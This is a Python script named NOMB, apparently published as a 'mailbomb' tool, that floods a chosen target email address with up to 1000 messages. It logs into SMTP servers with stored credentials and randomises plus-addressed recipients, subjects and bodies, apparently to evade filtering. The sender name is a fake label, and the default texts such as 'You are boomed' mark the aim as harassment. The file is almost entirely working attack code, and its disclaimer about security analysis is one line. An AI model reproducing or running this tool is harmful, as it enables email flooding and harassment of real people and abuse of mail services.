"""
NOMB is a massmail attacker, which helps the security analysis to understand the process of 
massmail and/or mailbomb attack. However using this scripts without the permission of the 
mail owner can be illegal.
Author : Nabil Islam 
Last modified : 24th October, 2024
"""

# importing libs
import smtplib
import random
import string
import re
import json
import sys
import os
from email.mime.text import MIMEText

# General Header
print(r""" _   _  ___  __  __ ____
| \ | |/ _ \|  \/  | __ )
|  \| | | | | |\/| |  _ \
| |\  | |_| | |  | | |_) |
|_| \_|\___/|_|  |_|____/""")
print("****************************************************************")
print("*             © Copyright NABIL, 2024                          *")
print("\n*           https://w3nabil.github.io/                         *")
print("****************************************************************")

# Checking if config file exist or not, if not then exit
if not os.path.exists('mailconfig.json'):
    print("Config file not found, Try running sudo mailconfig.py first.")
    sys.exit(1)
else:
    print("Found mailconfig.json")

# Check if src exist or not, if not then create
if not os.path.exists(os.path.join(os.getcwd(), 'src')):
    try:
        os.makedirs(os.path.join(os.getcwd(), 'src'))
        print("Folder 'src' created.")
    except Exception as e:
        print("Failed to create 'src' folder, Try creating the folder or run the script with sudo")
else:
    print("Found src folder")

# Load config file
with open("mailconfig.json", "r") as f:
    data = json.load(f)

# SMTP Info from json
smtp_server = data.get("smtp_server")
smtp_port = data.get("smtp_port")
smtp_user = data.get("smtp_user")
smtp_password = data.get("smtp_password")


# Attack Range Input
print("How many mails would you like to send? [Default 100]\n")
AttackRange = input(" > ") or 100

# Limiting the Attack Range
if int(AttackRange) > 1000:
    print("The Maximum limit to send mailbomb is set to 1000 to prevent extreme spam.")
    print("The attack range is automatically set to 1000")
    AttackRange = 1000
elif int(AttackRange) <= 0:
    print("The minimum limit to send mailbomb is set to 1.")
    print("The attack range is automatically set to 1")
    AttackRange = 1

# Target Email Input
print("Please provide the target email address..")
targetemail = input(" > ")

""" 
Validate Target Email Address
Credit : Github Co-pilot 
"""
def validemail(email):
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email):
        print("Invalid Email Address")
        sys.exit(1)
    else:
        email = email

# Checking email
validemail(email=targetemail)

# Split the mail address
email = targetemail.split("@")

# Subject (Plain)
print("Please Wrtie down the Subject of the email..")
mailsubject = input(" > ") or "You are boomed"

# Body (Plain)
print("Please Wrtie down the Body of the email..")
mailbody = input(" > ") or "It wasn\'t really nice to see that you were boomed this way :("

# Sender Name (Plain)
print("Beep Boop! Whats the name of the sender? [Default = Call Ambulance]")
mailname = input(" > ") or "Call Ambulance"

# Make Mail List (Changeable Everytime)
with open('./src/massmaillist.txt', 'w') as file:
    for i in range(int(AttackRange)):
        RanLetters = ''.join(random.choice(string.ascii_letters)for _ in range(6))
        Mail = email[0] + "+" + RanLetters + "@" + email[1]
        file.write(Mail+ '\n')

# Make Subject List (Changeable)
with open('./src/massmailsubject.txt', 'w') as file:
    for i in range(int(AttackRange)):
        RanLetters = ''.join(random.choice(string.ascii_letters)for _ in range(6))
        Subject = f"{mailsubject} [" + RanLetters + "]"
        file.write(Subject+'\n')

# Make Body List (Changeable)
with open('./src/massmailbody.txt', 'w') as file:
    for i in range(int(AttackRange)):
        RanLetters = ''.join(random.choice(string.ascii_letters)for _ in range(6))
        Body = f"{mailbody} (" + RanLetters +  ")"
        file.write(Body + '\n')

"""
Opening all necessary files and striping them
"""
def read_file(filepath):
    with open(filepath, 'r') as file:
        return [line.strip() for line in file.readlines()]

# getting data from files
Emails = read_file('./src/massmaillist.txt')
Subjects = read_file('./src/massmailsubject.txt')
Bodies = read_file('./src/massmailbody.txt')

# n = n for body = email , cause body cant be empty yk
if len(Emails) != len(Subjects) or len(Subjects) != len(Bodies):
    print("Error: The number of recipients, subjects, and bodies must be the same.")
    sys.exit(1)

# Loop run for lenth of n times
for i in range(len(Emails)):
    receiver_email = Emails[i]
    subject = Subjects[i]
    body = Bodies[i]
    # Email Generating
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = mailname
    msg['To'] = receiver_email

    # Try connect smtp
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            # Check if login is correct
            try:
                server.login(smtp_user, smtp_password)
            # If not then say "login issues :3"
            except Exception as e:
                print("The SMTP Mail or Password is invalid.")
                sys.exit(1)
            server.sendmail(smtp_user, receiver_email, msg.as_string())
        # Success message, yay!
        print(f"Email {i+1} sent successfully!")
    # If error connecting then exit
    except Exception as e:
        # Lf better error handling
        print(f"Failed to send email {i+1} to {receiver_email}: {e}")
